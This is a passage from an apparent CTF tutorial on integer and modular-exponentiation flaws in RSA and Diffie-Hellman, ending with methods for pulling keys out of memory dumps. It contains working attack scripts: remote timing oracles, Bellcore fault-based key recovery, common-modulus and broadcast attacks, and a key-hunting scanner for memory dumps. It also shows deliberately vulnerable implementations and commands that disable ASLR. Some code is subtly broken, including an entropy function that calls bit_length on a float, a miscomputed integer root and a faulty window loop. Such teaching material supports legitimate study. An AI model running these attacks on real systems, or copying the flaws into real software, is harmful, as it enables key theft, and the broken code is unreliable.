- Check for `/GS` flag (buffer security check)
- Some Windows APIs use `DWORD` (32-bit unsigned) which may differ from Linux `long` (64-bit)

**Cross-platform issues:**

```c
// Dangerous: size_t varies by platform
size_t len = get_length();  // 32-bit on 32-bit systems, 64-bit on 64-bit

// Safer: Use fixed-width types
uint64_t len = get_length();

// Dangerous: long is 32-bit on Windows x64, 64-bit on Linux x64
long offset = calculate_offset();

// Safer: Use int64_t or long long
int64_t offset = calculate_offset();
```

---

### Modular Exponentiation Flaws

Modular exponentiation (`a^b mod n`) is fundamental to asymmetric cryptography (RSA, Diffie-Hellman, DSA, ECC). Implementation flaws can leak private keys through side channels, produce incorrect results enabling forgeries, or allow mathematical attacks.

**Core algorithm:**

**Naive (insecure) implementation:**

```python
def modexp_naive(base, exponent, modulus):
    """INSECURE: Vulnerable to timing attacks and overflow"""
    result = 1
    for i in range(exponent):
        result = (result * base) % modulus
    return result

# Problems:
# - Time proportional to exponent (leaks exponent through timing)
# - Inefficient for large exponents
# - Intermediate values may overflow in fixed-width implementations
```

**Square-and-multiply (basic efficient implementation):**

```python
def modexp_square_multiply(base, exponent, modulus):
    """More efficient but still vulnerable to timing attacks"""
    result = 1
    base = base % modulus
    
    while exponent > 0:
        if exponent & 1:  # If bit is 1
            result = (result * base) % modulus
        exponent >>= 1
        base = (base * base) % modulus
    
    return result

# Problems:
# - Timing varies based on exponent bit pattern
# - Cache timing leaks bit positions
# - Branch prediction leaks secret bits
```

**Montgomery ladder (timing-resistant):**

```python
def modexp_montgomery(base, exponent, modulus):
    """Constant-time for same bit length (more secure)"""
    r0 = 1
    r1 = base % modulus
    
    # Process from most significant bit
    bit_length = exponent.bit_length()
    
    for i in range(bit_length - 1, -1, -1):
        if (exponent >> i) & 1:
            r0 = (r0 * r1) % modulus
            r1 = (r1 * r1) % modulus
        else:
            r1 = (r0 * r1) % modulus
            r0 = (r0 * r0) % modulus
    
    return r0

# [Inference] Still may leak through memory access patterns
```

---

**Common implementation flaws:**

**Flaw 1: Incorrect modular reduction**

**Vulnerable pattern:**

```c
// Incorrect: May overflow before modulo
uint64_t modexp_broken(uint64_t base, uint64_t exp, uint64_t mod) {
    uint64_t result = 1;
    while (exp > 0) {
        if (exp & 1) {
            result = result * base % mod;  // Overflow in result * base
        }
        base = base * base % mod;  // Overflow in base * base
        exp >>= 1;
    }
    return result;
}
```

**Exploitation:**

```python
# Test with values that cause overflow
base = 2**32
exp = 3
mod = 2**64 - 1

# Vulnerable implementation produces incorrect result due to overflow
# Correct result: (2^32)^3 mod (2^64-1) = 2^96 mod (2^64-1)
```

**Detection in CTF:**

```python
# Test with boundary values
def test_modexp_implementation(target_function):
    """Test for overflow issues"""
    test_cases = [
        (2**31, 2, 2**32 - 1),  # Large base
        (2, 2**31, 2**32 - 1),  # Large exponent
        (2**32 - 1, 2**32 - 1, 2**32 - 1),  # All values near max
    ]
    
    for base, exp, mod in test_cases:
        result = target_function(base, exp, mod)
        expected = pow(base, exp, mod)  # Python's correct implementation
        
        if result != expected:
            print(f"VULNERABLE: {base}^{exp} mod {mod}")
            print(f"Got: {result}, Expected: {expected}")
            return True
    
    return False
```

---

**Flaw 2: Exponent reduction errors**

**Mathematical background:**

By Euler's theorem: `a^φ(n) ≡ 1 (mod n)` for `gcd(a,n) = 1`

Therefore: `a^b ≡ a^(b mod φ(n)) (mod n)`

**Vulnerable code:**

```python
def rsa_decrypt_vulnerable(ciphertext, d, n):
    # Incorrect: Reduces exponent mod n instead of φ(n)
    d_reduced = d % n
    return pow(ciphertext, d_reduced, n)

# For RSA: φ(n) = (p-1)(q-1) where n = p*q
# Using d mod n instead of d mod φ(n) produces wrong result
```

**Exploitation:**

```python
from Crypto.Util.number import getPrime, inverse

# Generate RSA keys
p = getPrime(512)
q = getPrime(512)
n = p * q
phi_n = (p - 1) * (q - 1)
e = 65537
d = inverse(e, phi_n)

# Encrypt message
m = 42
c = pow(m, e, n)

# Correct decryption
m_correct = pow(c, d, n)
print(f"Correct: {m_correct}")  # 42

# Vulnerable decryption (reduces d mod n)
d_wrong = d % n  # Incorrect reduction
m_wrong = pow(c, d_wrong, n)
print(f"Wrong: {m_wrong}")  # Not 42

# Detection: If implementation uses exponent reduction, test with crafted values
```

**CTF detection script:**

```python
def detect_exponent_reduction_flaw(encrypt_func, decrypt_func):
    """Test if implementation incorrectly reduces exponents"""
    
    # Generate small RSA parameters for testing
    p, q = 61, 53
    n = p * q
    phi_n = (p - 1) * (q - 1)
    e = 17
    d = inverse(e, phi_n)
    
    # Test message
    m = 42
    c = pow(m, e, n)
    
    # Decrypt normally
    m1 = decrypt_func(c, d, n)
    
    # Decrypt with exponent + φ(n) (should give same result)
    m2 = decrypt_func(c, d + phi_n, n)
    
    if m1 != m2:
        print("VULNERABLE: Incorrect exponent reduction")
        return True
    
    return False
```

---

**Flaw 3: Timing side channels**

**Theory:**

The time taken for modular exponentiation varies based on the secret exponent's bit pattern. This leaks information about private keys.

**Simple timing attack:**

```python
import time

def timing_attack_demo(base, exponent, modulus):
    """Measure time to identify exponent bits"""
    
    start = time.perf_counter()
    result = pow(base, exponent, modulus)
    duration = time.perf_counter() - start
    
    return duration

# Attacker performs many measurements
durations = []
for i in range(1000):
    # Target server performs: pow(base, secret_key, modulus)
    duration = timing_attack_demo(base, secret_key, modulus)
    durations.append(duration)

# Longer durations correlate with more 1-bits in secret_key
# [Inference] With statistical analysis, can recover key bits
```

**Advanced: Cache-timing attack simulation**

Cache-timing attacks exploit CPU cache behavior differences when accessing different memory locations during modular exponentiation.

```python
def simulate_cache_timing(exponent, bit_index):
    """Simulate cache behavior based on exponent bit"""
    
    # If bit is 1, different code path accessed (cache miss pattern)
    if (exponent >> bit_index) & 1:
        # Simulate cache miss
        return 100  # nanoseconds
    else:
        # Simulate cache hit
        return 10  # nanoseconds
    
# Attacker measures timing for each bit position
def recover_exponent_cache_timing(modexp_function, base, modulus, bit_length):
    """Recover exponent through cache timing analysis"""
    recovered_exponent = 0
    
    for bit_pos in range(bit_length):
        timings = []
        
        # Perform many measurements
        for trial in range(10000):
            start = time.perf_counter()
            modexp_function(base, unknown_exponent, modulus)
            duration = time.perf_counter() - start
            timings.append(duration)
        
        # Statistical analysis to determine bit value
        avg_timing = sum(timings) / len(timings)
        
        # [Inference] Higher timing variance indicates bit is 1
        if variance(timings) > threshold:
            recovered_exponent |= (1 << bit_pos)
    
    return recovered_exponent
```

**Real-world CTF exploitation:**

When challenge provides remote modular exponentiation oracle:

```python
import socket
import time
import statistics

def time_oracle(host, port, base, exponent_bits):
    """Measure timing for modexp oracle"""
    timings = []
    
    for _ in range(100):  # Multiple measurements for accuracy
        s = socket.socket()
        s.connect((host, port))
        
        start = time.perf_counter()
        s.send(f"{base}\n".encode())
        response = s.recv(1024)
        duration = time.perf_counter() - start
        
        s.close()
        timings.append(duration)
    
    return statistics.mean(timings), statistics.stdev(timings)

# Bit-by-bit recovery
def recover_key_timing(host, port, key_length):
    """Recover private key through timing analysis"""
    recovered_key = 0
    base = 2
    
    for bit_pos in range(key_length):
        # Hypothesis 1: bit is 0
        mean0, std0 = time_oracle(host, port, base, bit_pos)
        
        # Hypothesis 2: bit is 1 (sends different base to cause different computation)
        mean1, std1 = time_oracle(host, port, base * 2, bit_pos)
        
        # Statistical test (t-test or similar)
        if abs(mean1 - mean0) > 2 * (std0 + std1):
            recovered_key |= (1 << bit_pos)
            print(f"Bit {bit_pos}: 1")
        else:
            print(f"Bit {bit_pos}: 0")
    
    return recovered_key
```

**Mitigation detection:**

Check if implementation uses constant-time operations:

```bash
# Static analysis for branching on secret data
objdump -d challenge_binary | grep -A20 "modexp"

# Look for conditional branches (je, jne, jg, etc.) inside exponentiation loop
# Constant-time implementations avoid branches on secret bits

# Dynamic analysis with timing
python3 timing_test.py --samples 10000 --key-length 256
```

---

**Flaw 4: Small exponent attacks**

When exponent is small and no proper padding is used, direct attacks are possible.

**Low public exponent (RSA e=3):**

```python
def attack_low_exponent(ciphertexts, e, n):
    """Håstad's broadcast attack when same message sent to e recipients"""
    
    # If same plaintext m sent to e different recipients with e=3:
    # c1 = m^3 mod n1
    # c2 = m^3 mod n2  
    # c3 = m^3 mod n3
    
    # Use Chinese Remainder Theorem to recover m^3
    # Then take cube root to get m
    
    from sympy.ntheory.modular import crt
    
    # CRT to find m^3
    moduli = [n1, n2, n3]
    m_cubed = crt(moduli, ciphertexts)[0]
    
    # Integer cube root
    m = integer_nth_root(m_cubed, e)
    
    return m

def integer_nth_root(x, n):
    """Compute integer nth root"""
    # Binary search
    low, high = 0, x
    while low < high:
        mid = (low + high) // 2
        if mid ** n < x:
            low = mid + 1
        else:
            high = mid
    return low
```

**CTF application:**

```python
# If challenge provides multiple ciphertexts of same message with e=3
c1 = 12345...
c2 = 67890...
c3 = 11121...

n1 = ...
n2 = ...
n3 = ...

# Recover plaintext without private key
from sympy.ntheory.modular import crt

m_cubed, _ = crt([n1, n2, n3], [c1, c2, c3])

# Compute cube root
import gmpy2
m = gmpy2.iroot(m_cubed, 3)[0]
print(f"Recovered message: {m}")
```

---

**Flaw 5: Blinding bypass**

RSA blinding is a countermeasure against timing attacks.

**Blinding process (secure):**

```python
def rsa_decrypt_with_blinding(ciphertext, d, n, e):
    """Secure RSA decryption with blinding"""
    import random
    
    # Generate random blinding factor
    r = random.randint(2, n - 1)
    
    # Blind the ciphertext: c' = c * r^e mod n
    c_blinded = (ciphertext * pow(r, e, n)) % n
    
    # Decrypt blinded ciphertext: m' = (c')^d mod n
    m_blinded = pow(c_blinded, d, n)
    
    # Unblind: m = m' * r^(-1) mod n
    r_inv = pow(r, -1, n)  # Modular inverse
    m = (m_blinded * r_inv) % n
    
    return m
```

**Vulnerable implementations:**

**Flaw 5a: Weak random blinding factor**

```python
def rsa_decrypt_weak_blinding(ciphertext, d, n, e):
    """VULNERABLE: Predictable blinding factor"""
    import random
    
    # Weak: Using small or predictable r
    r = random.randint(2, 100)  # Too small, can be brute-forced
    
    c_blinded = (ciphertext * pow(r, e, n)) % n
    m_blinded = pow(c_blinded, d, n)
    r_inv = pow(r, -1, n)
    m = (m_blinded * r_inv) % n
    
    return m
```

**Exploitation:**

```python
def attack_weak_blinding(oracle_decrypt, ciphertext, e, n):
    """Brute-force weak blinding factor"""
    
    # Try all possible small blinding factors
    for r in range(2, 1000):
        # Blind ciphertext with guessed r
        c_test = (ciphertext * pow(r, e, n)) % n
        
        # Get timing for this ciphertext
        timing = measure_oracle_timing(oracle_decrypt, c_test)
        
        # If timing matches expected pattern, we found correct r
        # Can now correlate timings to recover d
        
    # [Inference] With correct r, timing analysis becomes trivial
```

**Flaw 5b: Blinding disabled for "performance"**

```c
// Vulnerable: Conditional blinding based on ciphertext size
long rsa_decrypt_conditional(BIGNUM *c, BIGNUM *d, BIGNUM *n) {
    // Only blind "large" ciphertexts
    if (BN_num_bits(c) > 1024) {
        // Apply blinding
        rsa_decrypt_with_blinding(c, d, n);
    } else {
        // Direct decryption (VULNERABLE)
        BN_mod_exp(result, c, d, n);
    }
}
```

**Exploitation:**

```python
# Send small ciphertexts to bypass blinding
small_ciphertext = 42
timing = measure_timing(small_ciphertext)

# Perform timing attack on unblinded operations
# Gradually recover private key d
```

---

**Flaw 6: CRT-RSA implementation errors**

RSA using Chinese Remainder Theorem (CRT) is faster but introduces additional attack surface.

**CRT-RSA algorithm:**

```python
def rsa_crt_decrypt(ciphertext, p, q, dp, dq, qinv):
    """
    Faster RSA decryption using CRT
    dp = d mod (p-1)
    dq = d mod (q-1)
    qinv = q^(-1) mod p
    """
    # Compute m1 = c^dp mod p
    m1 = pow(ciphertext, dp, p)
    
    # Compute m2 = c^dq mod q
    m2 = pow(ciphertext, dq, q)
    
    # Combine using CRT
    # m = m2 + q * (qinv * (m1 - m2) mod p)
    h = (qinv * (m1 - m2)) % p
    m = m2 + h * q
    
    return m
```

**Flaw 6a: Fault injection (Bellcore attack)**

If attacker can cause computational fault during one CRT computation:

```python
def bellcore_attack_simulation(ciphertext, p, q, dp, dq, qinv):
    """Simulate fault attack on CRT-RSA"""
    
    # Normal computation
    m1 = pow(ciphertext, dp, p)
    m2 = pow(ciphertext, dq, q)
    h = (qinv * (m1 - m2)) % p
    m_correct = m2 + h * q
    
    # Faulty computation (fault injected in m2 calculation)
    m2_faulty = (pow(ciphertext, dq, q) + 1) % q  # Bit flip
    h_faulty = (qinv * (m1 - m2_faulty)) % p
    m_faulty = m2_faulty + h_faulty * q
    
    # Attacker has both correct and faulty signatures
    # Can recover p using: gcd(m_correct - m_faulty, n)
    n = p * q
    from math import gcd
    
    recovered_p = gcd(m_correct - m_faulty, n)
    
    if recovered_p != 1 and recovered_p != n:
        print(f"Recovered p: {recovered_p}")
        recovered_q = n // recovered_p
        print(f"Recovered q: {recovered_q}")
        return True
    
    return False
```

**CTF application:**

```python
# If challenge provides signature oracle with fault injection capability

def exploit_faulty_oracle(oracle_url):
    """Exploit CRT-RSA implementation with fault injection"""
    import requests
    
    message = b"test message"
    
    # Get correct signature
    sig_correct = requests.post(f"{oracle_url}/sign", 
                                json={"message": message.hex()}).json()["signature"]
    
    # Trigger fault (if challenge provides fault injection endpoint)
    sig_faulty = requests.post(f"{oracle_url}/sign_faulty", 
                               json={"message": message.hex()}).json()["signature"]
    
    # Recover private key components
    sig_correct_int = int(sig_correct, 16)
    sig_faulty_int = int(sig_faulty, 16)
    n = int(requests.get(f"{oracle_url}/pubkey").json()["n"], 16)
    
    from math import gcd
    p = gcd(sig_correct_int - sig_faulty_int, n)
    
    if p > 1 and p < n:
        q = n // p
        print(f"Private key recovered: p={p}, q={q}")
        
        # Compute full private key
        phi_n = (p - 1) * (q - 1)
        e = 65537
        d = pow(e, -1, phi_n)
        
        return d
```

**Flaw 6b: Timing differences between p and q computations**

```python
def crt_timing_attack(oracle, ciphertext):
    """Exploit timing differences in CRT computations"""
    
    # CRT-RSA computes c^dp mod p and c^dq mod q
    # If p and q have different bit lengths, timing differs
    
    timings = []
    for _ in range(1000):
        start = time.perf_counter()
        oracle.decrypt(ciphertext)
        duration = time.perf_counter() - start
        timings.append(duration)
    
    # Analyze timing distribution
    # [Inference] Bimodal distribution may indicate different code paths
    # Can leak information about p and q sizes
```

---

**Flaw 7: Modulus reuse attacks**

**Common modulus attack:**

If two users share modulus `n` but have different exponents `e1` and `e2`:

```python
def common_modulus_attack(c1, c2, e1, e2, n):
    """
    Recover plaintext when same message encrypted with different exponents
    but same modulus
    
    c1 = m^e1 mod n
    c2 = m^e2 mod n
    
    If gcd(e1, e2) = 1, can compute m
    """
    from math import gcd
    
    # Extended Euclidean algorithm to find a, b such that:
    # a*e1 + b*e2 = gcd(e1, e2) = 1
    def extended_gcd(a, b):
        if b == 0:
            return a, 1, 0
        gcd_val, x1, y1 = extended_gcd(b, a % b)
        x = y1
        y = x1 - (a // b) * y1
        return gcd_val, x, y
    
    g, a, b = extended_gcd(e1, e2)
    
    if g != 1:
        print("Attack requires gcd(e1, e2) = 1")
        return None
    
    # If b is negative, need modular inverse
    if b < 0:
        c2_inv = pow(c2, -1, n)
        m = (pow(c1, a, n) * pow(c2_inv, -b, n)) % n
    else:
        m = (pow(c1, a, n) * pow(c2, b, n)) % n
    
    return m
```

**CTF exploitation:**

```python
# Challenge provides two encryptions of flag with same modulus

# User 1: e1 = 65537
c1 = 0x123456...
e1 = 65537

# User 2: e2 = 3
c2 = 0x789abc...
e2 = 3

# Shared modulus
n = 0xdef012...

# Recover plaintext without private key
flag = common_modulus_attack(c1, c2, e1, e2, n)
print(f"Flag: {bytes.fromhex(hex(flag)[2:])}")
```

---

**Flaw 8: Incorrect Montgomery multiplication**

Montgomery multiplication is used for efficient modular arithmetic in cryptographic implementations.

**Montgomery multiplication basics:**

Transform `a * b mod n` into Montgomery space for faster computation.

```python
def montgomery_multiply(a, b, n, r, n_prime):
    """
    Montgomery multiplication
    r = 2^k where k > log2(n)
    n_prime * n ≡ -1 (mod r)
    """
    t = a * b
    m = ((t % r) * n_prime) % r
    u = (t + m * n) // r
    
    if u >= n:
        return u - n
    return u
```

**Vulnerable implementation:**

```c
// Incorrect: Off-by-one in final reduction
uint64_t montgomery_mult_broken(uint64_t a, uint64_t b, 
                                uint64_t n, uint64_t n_prime) {
    uint64_t t = a * b;
    uint64_t m = (t * n_prime) & 0xFFFFFFFFFFFFFFFF;  // mod 2^64
    uint64_t u = (t + m * n) >> 64;  // divide by 2^64
    
    // BUG: Missing final conditional reduction
    return u;  // May return value >= n
}
```

**Testing for Montgomery bugs:**

```python
def test_montgomery_implementation(mont_func, n):
    """Test Montgomery implementation for correctness"""
    
    # Montgomery parameters
    import math
    k = math.ceil(math.log2(n)) + 1
    r = 2 ** k
    
    # Compute n_prime: n * n_prime ≡ -1 (mod r)
    n_prime = pow(n, -1, r)
    n_prime = (r - n_prime) % r
    
    # Test cases
    test_values = [
        (2, 3),
        (n - 1, n - 1),  # Maximum values
        (r // 2, r // 2),  # Mid-range
        (1, 1),  # Identity
    ]
    
    for a, b in test_values:
        result = mont_func(a, b, n, r, n_prime)
        expected = (a * b) % n
        
        if result != expected:
            print(f"VULNERABLE: {a} * {b} mod {n}")
            print(f"Got: {result}, Expected: {expected}")
            return True
    
    return False
```

---

**Flaw 9: Small subgroup attacks (Diffie-Hellman)**

**Theory:**

If generator `g` has small order in multiplicative group mod `p`, the shared secret has limited possible values.

```python
def small_subgroup_attack():
    """Exploit weak Diffie-Hellman parameters"""
    
    # Vulnerable: p-1 has small factors
    p = 1019  # p-1 = 2 × 509
    g = 2
    
    # Alice's secret: a
    # Alice sends: A = g^a mod p
    
    # Attacker sends small-order element
    # If g has small order d, then g^d = 1
    # All powers of g cycle through only d values
    
    # Find order of g
    def find_order(g, p):
        order = 1
        current = g
        while current != 1:
            current = (current * g) % p
            order += 1
            if order > p:  # Safety check
                break
        return order
    
    order = find_order(g, p)
    print(f"Order of {g} mod {p}: {order}")
    
    # If order is small, shared secret is one of only 'order' values
    # Can brute-force all possibilities
    
    possible_secrets = set()
    for i in range(order):
        possible_secrets.add(pow(g, i, p))
    
    print(f"Only {len(possible_secrets)} possible shared secrets")
    return possible_secrets
```

**CTF exploitation:**

```python
def exploit_weak_dh_parameters(p, g, A):
    """
    Given Alice's public key A = g^a mod p,
    exploit small subgroup to find shared secret
    """
    
    # Factor p-1 to find small subgroups
    from sympy import factorint
    
    p_minus_1_factors = factorint(p - 1)
    print(f"p-1 factors: {p_minus_1_factors}")
    
    # Test if g generates small subgroup
    def subgroup_order(g, p):
        order = 1
        current = g
        while current != 1 and order < 100000:
            current = (current * g) % p
            order += 1
        return order if current == 1 else None
    
    g_order = subgroup_order(g, p)
    
    if g_order and g_order < 10000:
        print(f"VULNERABLE: g has small order {g_order}")
        
        # Brute-force shared secret
        # Server computes: s = A^b mod p
        # Attacker tries all possible: s = A^i mod p for i in range(g_order)
        
        possible_secrets = []
        for b in range(min(g_order, 10000)):
            secret = pow(A, b, p)
            possible_secrets.append(secret)
        
        return possible_secrets
    
    return None
```

---

**Flaw 10: Sliding window exponentiation timing leaks**

Optimized modular exponentiation uses sliding window algorithm, which introduces timing variations.

**Sliding window algorithm:**

```python
def modexp_sliding_window(base, exponent, modulus, window_size=4):
    """
    Sliding window exponentiation
    VULNERABLE: Timing varies with window size and bit patterns
    """
    
    # Precompute powers: base^1, base^3, base^5, ..., base^(2^window_size - 1)
    precomp = {}
    precomp[1] = base % modulus
    base_squared = (base * base) % modulus
    
    for i in range(1, 2 ** (window_size - 1)):
        precomp[2 * i + 1] = (precomp[2 * i - 1] * base_squared) % modulus
    
    result = 1
    i = exponent.bit_length() - 1
    
    while i >= 0:
        if not (exponent >> i) & 1:
            # Bit is 0: square
            result = (result * result) % modulus
            i -= 1
        else:
            # Bit is 1: find window
            j = max(i - window_size + 1, 0)
            
            # Extract window
            while j >= 0 and not (exponent >> j) & 1:
                j += 1
            
            # Get value in window
            window_value = (exponent >> j) & ((1 << (i - j + 1)) - 1)
            
            # Square for window length
            for _ in range(i - j + 1):
                result = (result * result) % modulus
            
            # Multiply by precomputed value
            result = (result * precomp[window_value]) % modulus
            
            i = j - 1
    
    return result
```

**Timing attack exploitation:**

```python
def analyze_sliding_window_timing(oracle, base, modulus, exponent_bits):
    """Recover exponent through sliding window timing analysis"""
    
    # Measure timing for different inputs
    timing_profile = []
    
    for bit_pattern in range(2 ** min(exponent_bits, 10)):
        start = time.perf_counter()
        oracle.compute(base, bit_pattern, modulus)
        duration = time.perf_counter() - start
        
        timing_profile.append((bit_pattern, duration))
    
    # Analyze timing variance
    # [Inference] Longer windows (consecutive 1-bits) take different time
    # than shorter windows
    
    # Group by Hamming weight (number of 1-bits)
    from collections import defaultdict
    by_hamming = defaultdict(list)
    
    for pattern, timing in timing_profile:
        weight = bin(pattern).count('1')
        by_hamming[weight].append(timing)
    
    # Statistical analysis reveals exponent structure
    for weight, timings in by_hamming.items():
        avg = sum(timings) / len(timings)
        print(f"Hamming weight {weight}: avg {avg:.6f}s")
```

---

**Tools for detecting modular exponentiation flaws:**

**1. Timing analysis with timing-side-channels toolkit:**

```bash
# Install dudect (constant-time checker)
git clone https://github.com/oreparaz/dudect
cd dudect

# Create test harness for target function
cat > test_modexp.c << 'EOF'
#include "dudect.h"

uint8_t do_one_computation(uint8_t *data) {
    // Call target modular exponentiation
    uint64_t base = *(uint64_t*)data;
    uint64_t exp = *(uint64_t*)(data + 8);
    uint64_t mod = *(uint64_t*)(data + 16);
    
    return modexp_target(base, exp, mod);
}

void prepare_inputs(uint8_t *input_data, uint8_t *classes) {
    // Generate inputs with different exponent bit patterns
    randombytes(input_data, number_measurements * chunk_size);
    
    for (size_t i = 0; i < number_measurements; i++) {
        classes[i] = input_data[i * chunk_size + 8] & 1;  // Class by LSB
    }
}
EOF

# Compile and run
gcc -O2 -o test_modexp test_modexp.c dudect.c -lm
./test_modexp

# Output indicates if timing leaks exist
```

**2. OpenSSL constant-time verification:**

```bash
# Check if OpenSSL operations are constant-time
# Use ctgrind (constant-time checker using Valgrind)

git clone https://github.com/agl/ctgrind
cd ctgrind

# Compile OpenSSL with special flags
export CC="gcc -g"
./configure --debug
make

# Run test
valgrind --tool=ctgrind --ctgrind-out-file=ct.log ./test_rsa

# Analyze output for timing leaks
grep "potentially variable time" ct.log
```

**3. Automated testing with Python:**

```python
import subprocess
import statistics
import scipy.stats

def detect_timing_leak(binary_path, input_generator, trials=1000):
    """
    Statistical test for timing side channels
    Uses t-test to detect timing differences
    """
    
    # Generate two input classes
    class_0_timings = []
    class_1_timings = []
    
    for _ in range(trials):
        # Class 0: exponent with mostly 0-bits
        input_0 = input_generator(hamming_weight=0.1)
        timing_0 = measure_execution_time(binary_path, input_0)
        class_0_timings.append(timing_0)
        
        # Class 1: exponent with mostly 1-bits
        input_1 = input_generator(hamming_weight=0.9)
        timing_1 = measure_execution_time(binary_path, input_1)
        class_1_timings.append(timing_1)
    
    # Perform Welch's t-test
    t_statistic, p_value = scipy.stats.ttest_ind(
        class_0_timings, 
        class_1_timings, 
        equal_var=False
    )
    
    print(f"T-statistic: {t_statistic}")
    print(f"P-value: {p_value}")
    
    # Threshold for detecting leak
    if abs(t_statistic) > 4.5:  # Common threshold
        print("VULNERABLE: Significant timing difference detected")
        return True
    else:
        print("No significant timing leak detected")
        return False

def measure_execution_time(binary, input_data):
    """Measure execution time for single run"""
    import time
    
    start = time.perf_counter()
    proc = subprocess.run([binary], input=input_data, 
                         capture_output=True, timeout=1)
    duration = time.perf_counter() - start
    
    return duration
```

**4. Using FactorDB for weak modulus detection:**

```python
import requests

def check_weak_modulus(n):
    """Check if modulus is factorable using FactorDB"""
    
    # Query FactorDB API
    url = f"http://factordb.com/api?query={n}"
    response = requests.get(url).json()
    
    if response['status'] == 'FF':  # Fully factored
        print(f"VULNERABLE: Modulus is fully factored")
        print(f"Factors: {response['factors']}")
        return True
    elif response['status'] == 'CF':  # Compositeness proven
        print(f"Modulus is composite but not fully factored")
        return False
    else:
        print(f"Factorization status: {response['status']}")
        return False

# Example usage
n = 0x9d3e91b60f3f34f7f5f4f5f6f7f8f9fa  # Test modulus
check_weak_modulus(n)
```

---

**Platform-specific considerations:**

**Linux:**

- Use `perf` for CPU cycle-accurate timing measurements
- ASLR and KASLR may affect cache-timing attacks
- Huge pages can alter cache behavior

```bash
# Disable ASLR for consistent timing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Measure with perf
perf stat -e cycles,instructions ./modexp_test

# Enable hardware performance counters
sudo sysctl kernel.perf_event_paranoid=0
```

**Windows:**

- QueryPerformanceCounter() provides high-resolution timing
- Windows Defender may interfere with timing measurements
- Different memory allocator behavior than Linux

```python
# Windows high-resolution timing
import ctypes

kernel32 = ctypes.windll.kernel32

def query_performance_counter():
    counter = ctypes.c_int64()
    kernel32.QueryPerformanceCounter(ctypes.byref(counter))
    return counter.value

def query_performance_frequency():
    frequency = ctypes.c_int64()
    kernel32.QueryPerformanceFrequency(ctypes.byref(frequency))
    return frequency.value

# Measure execution time
freq = query_performance_frequency()
start = query_performance_counter()
# ... operation to measure ...
end = query_performance_counter()
duration_seconds = (end - start) / freq
```

---

**Key takeaways for CTF scenarios:**

1. **Always test boundary values**: Maximum integers, zero, one, prime-1
2. **Look for timing variations**: Multiple measurements reveal implementation details
3. **Check for proper error handling**: Does implementation validate inputs?
4. **Test with known-vulnerable parameters**: Small primes, weak generators, small exponents
5. **Analyze assembly code**: Reveals branches on secret data
6. **Use statistical tests**: T-test, chi-square for timing leak detection
7. **[Inference] Montgomery and CRT optimizations introduce complexity**: More attack surface

---

## Important Related Topics

For complete coverage of integer arithmetic vulnerabilities in cryptographic CTF challenges:

- **Side-channel attack tools**: ChipWhisperer, Riscure Inspector for hardware timing
- **Lattice-based attacks on modular arithmetic**: LLL algorithm for weak random number generators
- **Fault injection techniques**: Rowhammer, voltage glitching, clock glitching
- **Batch GCD attacks**: Detecting shared factors across multiple RSA moduli
- **Karatsuba and FFT multiplication vulnerabilities**: Cache-timing in large integer multiplication

---

## Memory Management

### Key Material in Plaintext Memory

Cryptographic keys stored in plaintext memory represent a critical vulnerability where sensitive key material remains accessible through memory dumps, debugging interfaces, or direct memory access. Unlike encrypted storage, plaintext keys can be extracted without additional cryptographic operations, making memory analysis a primary attack vector in CTF scenarios.

**Memory Dump Analysis**

```bash
# Analyze process memory dump
strings memory.dump | grep -E "^[A-Fa-f0-9]{32,}$"

# Search for common key formats
strings memory.dump | grep -E "(BEGIN|END) (RSA|DSA|EC|ENCRYPTED) PRIVATE KEY"

# Extract hexadecimal sequences of key length
strings memory.dump | grep -oE "[A-Fa-f0-9]{64}" > potential_keys.txt

# Search for AES key patterns (128/192/256-bit)
xxd memory.dump | grep -E "([0-9a-f]{2} ){16}"  # 128-bit
xxd memory.dump | grep -E "([0-9a-f]{2} ){24}"  # 192-bit
xxd memory.dump | grep -E "([0-9a-f]{2} ){32}"  # 256-bit
```

**Binary Memory Analysis**

```bash
# Install volatility for advanced memory forensics
apt-get install volatility3

# List processes in memory dump
vol3 -f memory.dmp linux.pslist

# Extract process memory
vol3 -f memory.dmp linux.memmap --pid 1234 --dump

# Search for specific patterns in extracted memory
xxd -p memmap.1234.dmp | tr -d '\n' | grep -o "[0-9a-f]\{64\}"
```

**Volatility Analysis for Crypto Keys**

```bash
# List loaded libraries (crypto libraries indicate key presence)
vol3 -f memory.dmp linux.lsmod | grep -E "crypto|ssl|aes"

# Extract environment variables (may contain keys)
vol3 -f memory.dmp linux.envars

# Check command line arguments (keys passed as parameters)
vol3 -f memory.dmp linux.cmdline

# Dump specific process memory regions
vol3 -f memory.dmp linux.elfs --pid 1234
```

**Python Memory Analysis Script**

```python
#!/usr/bin/env python3
import re
import sys

def find_rsa_keys(memory_file):
    """
    Search for RSA key components (n, e, d, p, q) in memory
    """
    with open(memory_file, 'rb') as f:
        data = f.read()
    
    # Search for PEM-encoded keys
    pem_pattern = rb'-----BEGIN (.+?) PRIVATE KEY-----(.+?)-----END \1 PRIVATE KEY-----'
    for match in re.finditer(pem_pattern, data, re.DOTALL):
        key_type = match.group(1).decode('utf-8', errors='ignore')
        print(f"[+] Found {key_type} private key at offset {hex(match.start())}")
        key_data = match.group(0)
        with open(f'extracted_key_{match.start()}.pem', 'wb') as out:
            out.write(key_data)
    
    # Search for ASN.1 DER-encoded RSA keys
    # RSA private key structure: SEQUENCE with INTEGER components
    der_pattern = rb'\x30[\x80-\xff].{0,10}\x02\x01\x00'  # SEQUENCE followed by version
    for match in re.finditer(der_pattern, data):
        print(f"[+] Potential DER key at offset {hex(match.start())}")

def find_symmetric_keys(memory_file, key_size=32):
    """
    Extract potential symmetric keys based on entropy analysis
    """
    with open(memory_file, 'rb') as f:
        data = f.read()
    
    # Slide through memory with key_size window
    candidates = []
    for i in range(0, len(data) - key_size, 1):
        chunk = data[i:i+key_size]
        
        # Calculate byte entropy (high entropy suggests key material)
        entropy = calculate_entropy(chunk)
        
        if entropy > 7.5:  # High entropy threshold
            candidates.append((hex(i), chunk.hex()))
    
    print(f"[+] Found {len(candidates)} high-entropy {key_size}-byte sequences")
    return candidates[:10]  # Return top candidates

def calculate_entropy(data):
    """Shannon entropy calculation"""
    if len(data) == 0:
        return 0
    
    entropy = 0
    for x in range(256):
        p_x = data.count(bytes([x])) / len(data)
        if p_x > 0:
            entropy += - p_x * (p_x.bit_length() - 1)
    
    return entropy

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <memory_dump>")
        sys.exit(1)
    
    print("[*] Searching for RSA keys...")
    find_rsa_keys(sys.argv[1])
    
    print("\n[*] Searching for symmetric keys (256-bit)...")
    keys = find_symmetric_keys(sys.argv[1], 32)
